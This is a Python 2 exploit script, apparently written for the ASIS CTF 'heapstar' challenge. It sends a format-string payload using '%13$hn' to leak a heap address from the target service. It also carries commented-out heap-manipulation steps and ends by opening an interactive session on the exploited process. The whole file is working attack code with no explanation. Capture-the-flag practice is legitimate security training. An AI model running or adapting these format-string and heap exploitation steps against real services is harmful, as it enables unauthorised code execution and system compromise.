import socket
import struct
import telnetlib
import hexdump
def interact(s):
	t = telnetlib.Telnet()
	t.sock = s
	t.interact()
def recvu(s,string):
	r = ""
	while not r.endswith(string):
		tmp = s.recv(1)
		if not tmp: break
		r += tmp
	return r

s = socket.create_connection(['0',1234])
#s = socket.create_connection(['heapstar.asis-ctf.ir',1337])
raw_input()
s.send('i\n')
s.send("a"*0x10+'\n')
s.send('i\n')
s.send("b"*0x15+'\n')
s.send('i\n')
s.send("c"*0x15+'\n')
s.send('c\n')
s.send('i\n')
s.send("%"+str(0xBDB)+"c"+"%13$hn%x%xA\n")
s.send('p\n')
#interact(s)
#heap = int(recvu(s,'A>>')[-9-2:-4],16)+0x230
heap = int(recvu(s,'A')[-9:-2],16)
print hex(heap)
'''
s.send("a"*0x15+'\n')
s.send('i\n')
s.send("b"*0x15+'\n')
s.send('i\n')
s.send("c"*0x15+'\n')
s.send('c\n')
'''
s.send('\x00\n')
'''
s.send('i\n')
s.send("\x00"*(0x15-5)+struct.pack('<I',heap)+"\x00"+'\n')
s.send('i\n')
s.send('n'*0x30+'\n')
s.send('i\n')
s.send('m'*0x30+'\n')
s.send('i\n')
s.send('k'*0x30+'\n')
s.send('d\n')
s.send('\x00\n')
s.send('d\n')
'''
#s.send('i\n')
#s.send('a'*0x4012B5+'\n')
print "***** interact *****"
interact(s)
